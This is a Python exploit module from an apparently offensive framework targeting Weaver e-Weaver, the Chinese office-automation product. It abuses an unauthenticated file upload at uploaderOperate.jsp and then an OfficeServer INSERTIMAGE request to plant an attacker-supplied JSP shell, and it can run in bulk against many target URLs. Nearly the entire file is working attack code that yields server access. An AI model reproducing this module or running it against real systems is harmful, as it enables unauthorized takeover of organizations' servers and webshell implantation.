import re

import aiohttp

from zerooo.core.asyncpool import async_run
from zerooo.core.log import LOGGER
from zerooo.core.options import Option, OptArgset
from zerooo.request.httpclient import HttpClient
from zerooo.utils.util import return_shell_file, header_format_dict


class Zerooosploit(Option):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': '泛微 e-Weaver未授权任意文件上传',
            'Module': 'exploit/weaver/e-weaver-unauthorized-upload',
            'Product': 'e-Weaver',
            'Cve': '',
            'Create_date': '20210729',
            'Description': '泛微 e-Weaver未授权任意文件上传,可以上传jsp文件拿到服务器权限',
            'Authors': '01sec',
            'References': ''
        }

        self.option = {
            'urls': {'Current Setting': OptArgset.urls, 'Required': 'yes', 'Description': '目标url，多个目标请用,分开'},
            'limit': {'Current Setting': None, 'Required': 'no', 'Description': '并发限制（默认根据当前系统自动调整）'},
            'file': {'Current Setting': None, 'Required': 'no', 'Description': '上传文件路径'}
        }

    async def e_weaver_unauthorized_upload(self, urls):
        file = self.get_options('file')
        file_content, flag = return_shell_file(file)
        if flag:
            upload_data = aiohttp.FormData()
            upload_data.add_field('secId', '1', content_type=None)
            upload_data.add_field('Filedata', file_content, filename=file, content_type='multipart/form-data')
            upload_data.add_field('plandetailid', '1', content_type=None)
            resp = await HttpClient().send_request_cgi('POST',
                                                       url=urls + 'workrelate/plan/util/uploaderOperate.jsp',
                                                       data=upload_data)
            if resp:
                if resp['code'] == 200:
                    fileid = re.findall('fileid=(\d+\.?\d*)', resp['text'])
                    if len(fileid) > 0:
                        LOGGER.info(f'上传后的文件编号 (Upload file id) : {fileid}')
                        release_file_data = aiohttp.FormData()
                        payload = "{'OPTION': 'INSERTIMAGE', 'isInsertImageNew': '1', 'imagefileid4pic': %s}" % fileid[
                            0]
                        release_file_data.add_field('aaa', payload, content_type='multipart/form-data')
                        resp1 = await HttpClient().send_request_cgi('POST', url=urls + 'OfficeServer',
                                                                    data=release_file_data)
                        result = header_format_dict(resp1['headers'])
                        # 检查IMAGETYPE是否存在
                        if 'IMAGETYPE' in result:
                            if result['IMAGETYPE'].find(file):
                                LOGGER.success(f'上传路径 (Upload path) : {urls + file}')
                                return resp1

                LOGGER.info(f'不存在任意文件上传漏洞 (No file upload vulnerability) : {urls}')
                return None
        else:
            LOGGER.warning(f'文件不存在 (File does not exist) : {file}')
            return None

    @staticmethod
    def e_weaver_unauthorized_upload_callback(future):
        future.result()

    def exploit(self):
        urls = self.get_options('urls')
        limit = self.get_options('limit')
        async_run(self.e_weaver_unauthorized_upload, urls, self.e_weaver_unauthorized_upload_callback, limit)
        LOGGER.info('运行完成 (exploit complete)')
